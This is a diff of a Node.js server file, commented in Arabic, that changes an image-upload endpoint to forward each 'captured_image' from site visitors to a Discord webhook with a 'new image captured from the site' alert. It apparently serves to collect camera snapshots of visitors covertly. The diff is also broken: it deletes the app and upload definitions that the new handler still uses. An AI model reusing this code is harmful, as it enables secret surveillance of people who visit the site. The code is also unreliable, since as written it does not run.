@@ -1,52 +1,45 @@
-const express = require('express');
-const multer = require('multer');
-const path = require('path');
-const cors = require('cors');
+// تأكد أن هذه المكتبات مستدعاة في أعلى ملف server.js إذا لم تكن موجودة
+const FormData = require('form-data');
+const axios = require('axios');
 const fs = require('fs');
 
-const app = express();
-
-// تعيين المنفذ ديناميكياً ليناسب بيئات الاستضافة السحابية أو 3000 محلياً
-const PORT = process.env.PORT || 3000;
-
-// تفعيل CORS للسماح لصفحة الـ HTML بإرسال البيانات للسيرفر
-app.use(cors());
-
-// التأكد من وجود مجلد uploads، وإذا لم يكن موجوداً يتم إنشاؤه تلقائياً
-const uploadDir = path.join(__dirname, 'uploads');
-if (!fs.existsSync(uploadDir)) {
-    fs.mkdirSync(uploadDir);
-}
-
-// إعداد ملتر (Multer) لتسمية وحفظ الصور المرفوعة
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => {
-        cb(null, uploadDir);
-    },
-    filename: (req, file, cb) => {
-        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
-        cb(null, 'snap-' + uniqueSuffix + path.extname(file.originalname));
-    }
-});
-
-const upload = multer({ storage: storage });
-
-// --- الواجهة الرئيسية الجديدة ---
-app.get('/', (req, res) => {
-    res.send('<h1 style="text-align: center; margin-top: 50px; font-family: sans-serif;">مرحباً بك</h1>');
-});
-
-// الرابط (API) المسؤول عن استقبال الصورة وحفظها
-app.post('/api/upload', upload.single('captured_image'), (req, res) => {
+// دالة استقبال الصور وإرسالها إلى ديسكورد
+app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
     if (!req.file) {
         return res.status(400).json({ error: 'لم يتم استقبال أي صورة' });
     }
-    console.log(`📸 تم استقبال صورة بنجاح وحفظها باسم: ${req.file.filename}`);
-    
-    res.status(200).json({ message: 'تم حفظ الصورة بنجاح!' });
-});
 
-// تشغيل السيرفر
-app.listen(PORT, () => {
-    console.log(`🚀 السيرفر يعمل الآن بنجاح على المنفذ: ${PORT}`);
+    console.log(`📸 تم استقبال صورة محلياً وجاري نقلها لديسكورد: ${req.file.filename}`);
+
+    try {
+        // تجهيز البيانات بصيغة Form Data لإرسال الملف
+        const discordData = new FormData();
+        discordData.append('file', fs.createReadStream(req.file.path), req.file.filename);
+        discordData.append('content', '🚨 **تم التقاط صورة جديدة من الموقع!**');
+
+        // ضع رابط الـ Webhook الخاص بك هنا بين العلامتين ''
+        const DISCORD_WEBHOOK_URL = 'ضع_رابط_الـ_Webhook_الذي_نسخته_هنا';
+
+        // إرسال الصورة عبر طلب POST إلى ديسكورد
+        await axios.post(DISCORD_WEBHOOK_URL, discordData, {
+            headers: discordData.getHeaders(),
+        });
+
+        console.log('🚀 تم إرسال الصورة بنجاح إلى قناة ديسكورد!');
+        
+        // مسح الصورة محلياً من سيرفر Render للحفاظ على المساحة
+        fs.unlinkSync(req.file.path); 
+
+        return res.status(200).json({ message: 'تم إرسال الصورة إلى ديسكورد بنجاح!' });
+
+    } catch (error) {
+        console.error('خطأ أثناء إرسال الصورة إلى ديسكورد:', error.message);
+        
+        // مسح الصورة حتى في حالة الفشل لتجنب تراكم الملفات
+        if (fs.existsSync(req.file.path)) {
+            fs.unlinkSync(req.file.path);
+        }
+        
+        return res.status(500).json({ error: 'فشل إرسال الصورة للوجهة النهائية' });
+    }
 });
